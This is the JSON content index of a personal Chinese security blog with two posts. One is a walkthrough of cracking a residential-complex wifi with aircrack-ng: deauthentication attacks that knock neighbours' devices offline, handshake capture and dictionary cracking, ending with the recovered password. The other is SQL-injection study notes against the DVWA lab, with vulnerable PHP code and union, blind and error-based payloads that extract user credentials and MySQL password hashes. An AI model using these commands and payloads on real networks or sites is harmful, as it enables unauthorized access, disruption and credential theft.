{"meta":{"title":"山城冰荔枝","subtitle":"","description":"","author":"山城冰荔枝","url":"https://sfyyh.github.io","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2023-08-03T12:38:08.372Z","updated":"2023-08-03T12:38:08.372Z","comments":false,"path":"/404.html","permalink":"https://sfyyh.github.io/404.html","excerpt":"","text":""},{"title":"关于","date":"2023-08-03T12:38:08.375Z","updated":"2023-08-03T12:38:08.375Z","comments":false,"path":"about/index.html","permalink":"https://sfyyh.github.io/about/index.html","excerpt":"","text":"个人详细介绍"},{"title":"标签","date":"2023-08-03T12:38:08.380Z","updated":"2023-08-03T12:38:08.380Z","comments":false,"path":"tags/index.html","permalink":"https://sfyyh.github.io/tags/index.html","excerpt":"","text":""},{"title":"书单","date":"2023-08-03T12:38:08.376Z","updated":"2023-08-03T12:38:08.376Z","comments":false,"path":"books/index.html","permalink":"https://sfyyh.github.io/books/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2023-08-03T12:38:08.378Z","updated":"2023-08-03T12:38:08.378Z","comments":true,"path":"links/index.html","permalink":"https://sfyyh.github.io/links/index.html","excerpt":"","text":""},{"title":"分类","date":"2023-08-03T14:00:34.003Z","updated":"2023-08-03T14:00:34.003Z","comments":true,"path":"categories/index.html","permalink":"https://sfyyh.github.io/categories/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2023-08-03T12:38:08.379Z","updated":"2023-08-03T12:38:08.379Z","comments":false,"path":"repository/index.html","permalink":"https://sfyyh.github.io/repository/index.html","excerpt":"","text":""}],"posts":[{"title":"记一次对小区wifi渗透","slug":"my-first-blog","date":"2023-08-03T13:43:26.000Z","updated":"2023-08-03T13:49:56.399Z","comments":true,"path":"2023/08/03/my-first-blog/","link":"","permalink":"https://sfyyh.github.io/2023/08/03/my-first-blog/","excerpt":"","text":"wifi渗透(一)第三步——检查并开启网卡的监听功能airmon-ng：检查网卡是否支持监听功能的 airmon-ng start wlan0mon ：激活无线网卡的监听模式 第四步——扫描周边wifi信号airodump-ng wlan0mon ：扫描当前周边环境的WiFi信号 注意：找到你要破解的wifi信息，记住它的BSSID和CH,后面要用！ 第五步——抓包下面里的部分信息根据自己的情况进行替换 抓包命令：airodump-ng -c &#x3D;&#x3D;CH号码&#x3D;&#x3D; –bssid &#x3D;&#x3D;BSSID号码&#x3D;&#x3D; -w &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;handshake wlan0mon 注意： 1-w后接抓包后得到的文件保存路径和名称，注意路径！ 我的用户名是kali，你的填你自己的 注：这种方式是一种被动等待的方式，所以我们需要将链接在该wifi上的设备踢下线，以便我们快速抓包。 这里我们需要记下BSSID(WIFI路由地址)和STATION（链接设备号），接下来我们将该设备从该wifi链接状态下强制踢下线 第六步——打掉连接ACK 死亡攻击：aireplay-ng -0 10 -a BSSID号 -c STATION号 wlan0mon 110——是攻击次数，一般10次就足够我们抓到包了，如果将次数调整的很大，那么就会持续的进行攻击，导致该设备长期无法链接到该wifi! 注：这样做将会导致连接在该wifi上的设备被强制下线，然后因为wifi的自动重连机制，使得我们可以快速抓到包。 最后一步——破解破解语法：aircrack-ng -w &lt;指定字典&gt; -b &lt;目的路由MAC地址&gt; &lt;抓到的握手包&gt; 注：目的路由MAC地址——就是BSSID 抓到的握手包——cap文件 kali自带字典：aircrack-ng -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -b 78:72:5D:E0:BC:37 &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;handshake-0*.cap 需要先解压：gzip -d &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz 自我指定字典：aircrack-ng -w &#x2F;home&#x2F;kali&#x2F;password.txt -b 78:72:5D:E0:BC:37 &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;handshake-0*.cap 成功！ 破解的wifi密码就为a123456789","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://sfyyh.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网安","slug":"网安","permalink":"https://sfyyh.github.io/tags/%E7%BD%91%E5%AE%89/"}]},{"title":"渗透学习记录OS","slug":"渗透学习记录OS","date":"2022-12-25T14:58:29.000Z","updated":"2023-08-03T14:59:14.200Z","comments":true,"path":"2022/12/25/渗透学习记录OS/","link":"","permalink":"https://sfyyh.github.io/2022/12/25/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95OS/","excerpt":"","text":"mysql默认表相关知识在 mysql5 版本以后，mysql 默认在数据库中存放在一个叫 infomation_schema 里面 这个库里面有很多表 重点是这三个表 columns 、tables、SCHEMATA 表字段 CHEMA_NAME 记录着库的信息 columns 存储该用户创建的所有数据库的库名、标名和字段名。 union联合注入攻击原理 步骤一：联合两表 ​ 1.union语句要求字段数一样才可以执行，所以我们要先进行字段判断 常见方法： 1SELECT * FROM `users` WHERE user_id=1 order by 8 判断出字段数为8 然后通过 1SELECT * FROM `users` WHERE user_id=1 union SELECT 1,2,3,4,5,6,7,8 进行联合查询 联合查询后面的语句 1SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT 1,2,user() select后面的数字可以替换成字段的名称或者函数 12-- 替换成mysql内置函数SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user(),md5(&#x27;a&#x27;),version() 123456-- 替换成mysql数据库里的字段SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users-- 也可以在语句后面加上limit限定显示的行数SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users limit 1SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users limit 0,2 12-- 如果不想要第一个表里的数据 可以把1换成-1 因为默认负数就表示不存在的SELECT * FROM guestbook WHERE `comment_id`=-1 union SELECT user_id,user,password from users limit 1 union联合注入攻击分析分析联合注入漏洞代码首先我们先分析构成联合注入攻击的sql注入代码 123456789101112131415161718192021222324252627&lt;?phpif( isset( $_REQUEST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input #这里传入的参数没有进行过滤直接进入sql语句 #从这里可以判断出id是字符串类型 所以在进行sql注入检测的时候要匹配字符 $id = $_REQUEST[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values //显示查询成功后的内容 $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);&#125;?&gt; 判断是否存在联合注入​ 我们先通过靶场查询id 如果在我们没进行源代码分析的基础上 我们首先需要进行数字和字符串判断 1 和1‘ 判断出传入数据是字符串型 即存在注入漏洞 ​ 输入 1’and ‘1’&#x3D;’1 页面返回用户信息 1’and ‘1’&#x3D;’2 页面返回不一样的信息。基本可以确定存在 SQL 注入漏洞. 判断字段数​ 使用语句order by确定当前表的字符数 ​ order by 1 如果页面返回正常 字段数不少于 1,order by 2 不少于 2，一直如此类推直到页面出错。正确的字段数是出错数字减少 1 公式 order by n-1 1’ order by 1–+ 正常 1’ order by 2–+ 正常 1’ order by 3–+ 出错 正常页面 联合查询注入获取敏感信息​ 跟前面咱们分析的一样，这里只是把查询的数据替换成了联合查询的语句 然后进行获取另一个表的字段或者函数 1-1&#x27; union select user,password from users-- 我们也可以使用group_concat（）函数来进行分组打印 1-1&#x27; union select 1,group_concat(user(),0x3A,version())-- 联合查询注入通过information_schema​ 在黑盒情况下我们是不知道当前数据库里都有哪些表的所以我们先从mysql的information_schema入手进行表的查询 第一个表： 这里的database（）函数是来限定查询的表是当前表 1-1&#x27; union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1)-- 第二个表： 1-1&#x27; union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,2)-- 通过两个表的查询我们知道dvwa中含有的表为guestbook 和users 联合查询注入通过information_schema获取字段我们知道数据库的字段都存在mysql默认内置库information_schema的columns里，所以我们想要获取当前数据库的字段名字我们可以通过 获取users表里的第一个字段名字 id 123-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 1)-- -- 注意这里一定要加上限定 因为你每次查询都是一个字段如果不加会报错-- Subquery returns more than 1 row 获取第二个字段名字 password 1-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 2,1)-- 获取第三个字段名字 email 1-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 3,1)-- 获取第四个字段名字 secret 1-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 4,1)-- …………………………. 通过联合查询表里面的内容​ 通过以上操作我们已经获取了当前数据库的库名、表名、字段 那么我们就可以通过下面语句获取表里面的内容了 1-1&#x27; union select 1,(select group_concat(user,0x3a,password) from users limit 1)-- boolean布尔型盲注入代码分析1234567891011121314151617181920212223242526272829&lt;?phpif( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123; // Get input #id为字符串型 get接收id参数 $id = $_GET[ &#x27;id&#x27; ]; // Check database $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &#x27;or die&#x27; to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The &#x27;@&#x27; character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;; &#125; else &#123; // User wasn&#x27;t found, so the page wasn&#x27;t! header( $_SERVER[ &#x27;SERVER_PROTOCOL&#x27; ] . &#x27; 404 Not Found&#x27; ); // Feedback for end user echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 接收 id 的值，直接带入查询，如果存在即返回 users is exists in the database 否则显示 users id is missing 像这种只有正确与错误页面。页面不会显示数据库 里任何内容，如果存在注入，成为盲注入。 ​ 盲注入的方法有两种：一是布尔型盲注入，二是延时注入 判断盲注入​ 我们可以通过1&#39; and &#39;1&#39;=&#39;1 和 1&#39; and &#39;1&#39;=&#39;2 是否一样 ​ 以及 1&#39; and sleep(10)--让他睡10s判断是否一样 Boolean布尔型注入攻击​ 因为页面不会返回查询的内容所以我们不能使用联合查询注入攻击，但是我们可以通过构造sql来获取数据。 ​ 11&#x27; and if(1=1,1,0)-- -- 三目运算 布尔型盲注入获取数据库敏感信息​ 在黑盒测试环境下，通过构造sql语句来进行获取敏感信息。 构造sql语句常用的函数： 1.SUBSTRING()字符串截取函数，第一个参数是字符串，第二个参数开始截取，第三个参数是截取的长度 我们可以构造这样的sql语句 1SELECT if(SUBSTRING(database(),1,1)=&#x27;d&#x27;,1,0) 如果截取的第一个字符是‘d’我们返回1 否则返回0 此类推。再后拼接字符就是完整的库名。 黑盒情况下进行布尔盲注入步骤： ​ 我们首先需要判断注入是否为布尔注入，判断完后就可以获取数据库的长度，得到长度再查询库名，然后查询表名，字段，字段内容。。。 布尔盲注入查询长度​ 通过构造如下sql语句进行数据库长度的查询 11&#x27; and if(length(database())=4,1,0)-- 判断出长度为4 布尔盲注入判断库名这一步操作其实就是通过遍历 10123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_ 与语句进行整合判断出是否返回1 11&#x27; and if(SUBSTRING(database(),1,1)=&#x27;$d&#x27;,1,0)-- 当然了，我们手动进行一个一个测试肯定很慢，那么我们可以借助burp来进行如此操作 带有构造sql语句的url 1http://192.168.18.137/01/vulnerabilities/sqli_blind/?id=1%27%20and%20if(SUBSTRING(database(),1,1)=%27d%27,1,0)--%20&amp;Submit=Submit# 再burp里面抓包然后送入intruder 先清除变量 然后再将数字和字母设为变量 攻击类型选择 cluster bomb 然后就是payloads里面两个变量的设置 然后开始攻击就行 跑出来的状态码为200即为成功！ 获得的数据库名为 dvwa 接着我们通过库名来获取表名 11&#x27; and if(SUBSTRING((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1),1,1)=&#x27;g&#x27;,1,0)-- 同样通过burp进行抓包 获取到表名guestbook 然后获取字段名 11&#x27; and if(SUBSTRING((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 1,1),1,1)=&#x27;l&#x27;,1,0)-- 同样我们用burp进行爆破 得到字段名为login password等 获得完 字段后 我们可以进一步获取字段内容【账号+密码】 11&#x27; and if(SUBSTRING((select CONCAT(user,0x3a,PASSWORD) from users limit 1),1,1)=&#x27;a&#x27;,1,0)-- 报错注入​ 顾名思义报错注入就是指数据库显示错误，比如sql语法错误 一般对于php。特别php 在执行 SQL 语句时一般都会采用异常处理函数，捕获错误信息。在 php 中 使用 mysql_error()函数 ​ 如果在查询注入时候会有报错信息返回，可以采用报错注入 报错注入分析1234567891011121314151617181920212223242526&lt;?phpif( isset( $_REQUEST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input # get传入id 字符串型 $id = $_REQUEST[ &#x27;id&#x27; ]; // Check database # mysqli_error 函数返回错误信息 $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);&#125;?&gt; 报错注入攻击​ 在输入框输入报错的sql拼接语句 11&#x27; and info()-- 它的原理是下面一条语句会执行但是会报错，在报错信息中会返回数据库名称 1SELECT first_name,last_name from users WHERE user_id=&#x27;1&#x27; and info() 报错注入获取敏感信息​ 通过构造sql语句，返回带有数据库敏感信息的错误信息 11&#x27; and (updatexml(1,concat(0x7e,(select user()),0x7e),1))-- 注意：这里为什么要用updatexml()呢，首先要先了解这个函数 updatexml(xml_doument,XPath_string,new_value)第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。第三个参数：new_value，String格式，替换查找到的符合条件的数据 简单点说，这个函数有三个参数，我们利用第二个参数必须要更改信息的xpath语句来进行报错注入。 为什么要在第二个参数里面加上concat语句呢？因为updatexml（）第二个参数需要进行xpath校验，如果第二个参数哪里不是xpath语句它会进行一次校验然后把校验后的错误信息返回 但是采用 updatexml 报错函数 只能显示 32 长度的内容，如果获取的内容超过 32 字符就要采用字符串截取方法。每次获取 32 个字符串的长度。 除了 updatexml 函数支持报错注入外，mysql 还有很多函数支持报错。 例如： 12345678910111213141516171819201.floor()select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2)) as x from information_schema.tables group by x)a);2.extractvalue()select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));3.updatexml()select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));4.geometrycollection()select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));5.multipoint()select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));6.polygon()select * from test where id=1 and polygon((select * from(select * from(select user())a)b));7.multipolygon()select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));8.linestring()select * from test where id=1 and linestring((select * from(select * from(select user())a)b));9.multilinestring()select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));10.exp()select * from test where id=1 and exp(~(select * from(select user())a)); 在黑盒模式下进行报错注入​ 流程还是根之前一样 库名-》表名-》字段-》字段内容 获取库名11&#x27; and (updatexml(1,(select concat(&#x27;`&#x27;,(select database()),&#x27;`&#x27;)),1))-- 获取表名 这次用floor报错，floor报错不会出现长度问题11&#x27; and (select 1 from (select count(*),concat((select (select(select distinct concat(0x7e,table_name,0x7e) from information_schema.tables where table_schema=database() limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2)) as x from information_schema.tables group by x)a)-- 获取表名为 guestbook 将limit 0,1 改成 1，1是获取第二个表users 获取字段获取users第一个字段 11&#x27; and (select 1 from(select count(*),,)) 获取账号密码 获取账号和密码需要root权限 123select authentication_string from mysql.user limit 1;select(updatexml(1,concat(0x7e,(select (select authentication_string from mysql.user limit 1 )),0x7e),1))select(updatexml(1,concat(0x7e,(select (substring((select authentication_string from mysql.user limit 1),32,40))),0x7e),1))","categories":[],"tags":[]}],"categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://sfyyh.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网安","slug":"网安","permalink":"https://sfyyh.github.io/tags/%E7%BD%91%E5%AE%89/"}]}